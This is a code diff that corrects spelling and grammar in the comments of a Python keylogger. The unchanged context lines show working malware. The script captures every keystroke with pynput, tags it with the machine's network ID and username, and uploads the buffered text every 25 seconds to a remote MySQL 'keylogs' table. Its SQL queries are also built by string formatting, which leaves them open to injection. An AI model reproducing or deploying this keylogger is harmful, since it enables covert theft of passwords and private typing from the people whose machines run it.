@@ -10,17 +10,17 @@ cache = [ ] #Where each line from the buffer will be stored.
 mysqldb = None
 
 sessionID = getNetworkID( ) #Getting computer ID from network card.
-sessionName = os.environ.get( "USERNAME" ) or "Unknow" #Getting computer username from eviroment variables.
+sessionName = os.environ.get( "USERNAME" ) or "Unknow" #Getting computer username from enviroment variables.
 
 class mysqlConnect:
 
     def __init__( self ):
 
-        while True: #Loop try connect until achieve it.
+        while True: #Loop try to connect until achieve it.
             try:
                 self.dbConnection = mysql.MySQLConnection( user = "USERNAME", password = "PASSWORD", host = "HOST", database = "DATABASE" ) #Put here your database connection info!
                 self.dbCursor = self.dbConnection.cursor( )
-                break #Stop loop if connection is established.
+                break #Stop loop if the connection is established.
             except mysql.Error:
                 print( "[ MySQL ] Couldn't connect to mysql database! Retrying in 5 seconds..." ) 
                 time.sleep( 5 ) #Freeze the script during 5 seconds.
@@ -30,7 +30,7 @@ class mysqlConnect:
         self.dbCursor.execute( "SELECT * from `keylogs` WHERE sessionID = %i" % sessionID )
         dbQuery = self.dbCursor.fetchall( )
 
-        if len( dbQuery ) == 0: #Check if sessionID already exist on database.
+        if len( dbQuery ) == 0: #Check if sessionID already exists on database.
             self.dbCursor.execute( "INSERT INTO `keylogs` ( `sessionID`, `sessionName`, `jsonLog` ) VALUES ( '%i', '%s', JSON_OBJECT( '%s', JSON_ARRAY( ) ) )" % ( sessionID, sessionName, time.strftime( dateFormat ) ) )
             print( "[ MySQL ] New session has been added for this computer and now is connected! ( %i )" % sessionID )
             self.dbConnection.commit( ) #Update database to efectue new changes.
@@ -48,7 +48,7 @@ class mysqlConnect:
                 cache = [ ] #After each save, cache variable'll be cleaned to save memory.
                 print( "[ MySQL ] Cache was saved successful!" )
             except mysql.Error:
-                mysqldb = mysqlConnect( ) #Try reconnect when connection was lost.
+                mysqldb = mysqlConnect( ) #Try to reconnect when connection was lost.
 
 
 mysqldb = mysqlConnect( ) #Establish connection to database.
@@ -68,7 +68,7 @@ def keyboardBuffering( keyCode ):
         if keyCode == "Key.space":
             buffer += " " #Adding space to buffer when space is pressed.
         elif keyCode == "Key.backspace":
-            buffer = buffer[ : -1 ] #Remove las char from buffer when backspace is pressed.
+            buffer = buffer[ : -1 ] #Remove last char from buffer when backspace is pressed.
         elif keyCode in bindKeys: #Check if bindKey is pressed.
             if len( buffer ) > 0: #Check if buffer is empty.
                 cache.append( [ time.strftime( "%H:%M:%S" ), buffer ] ) #Save current buffer in cache.
@@ -80,12 +80,12 @@ def keyboardBuffering( keyCode ):
 def checkTimer(  ):
     mysqldb.saveCache( ) #Save cache on database.
     timer = threading.Timer( 25, checkTimer ) #Call each 25 seconds to checkTime() function for saving!
-    timer.start( ) #Needed to new timing start.
+    timer.start( ) #Needed to start new timing.
 
-checkTimer( ) #Calling for first time checkTimer function. While loop won't works with pynput key event!
+checkTimer( ) #Calling for first time checkTimer function. While loop won't work with pynput key event!
 
 def onKeyDown( key ):
-    keyboardBuffering( str( key ) ) #Change returned key to string before send to keyboardBuffering( ) it'll prevent errors!
+    keyboardBuffering( str( key ) ) #Change returned key to string before sending to keyboardBuffering( ) it'll prevent errors!
 
 with pynput.keyboard.Listener( on_press=onKeyDown ) as listener:
 	listener.join( )
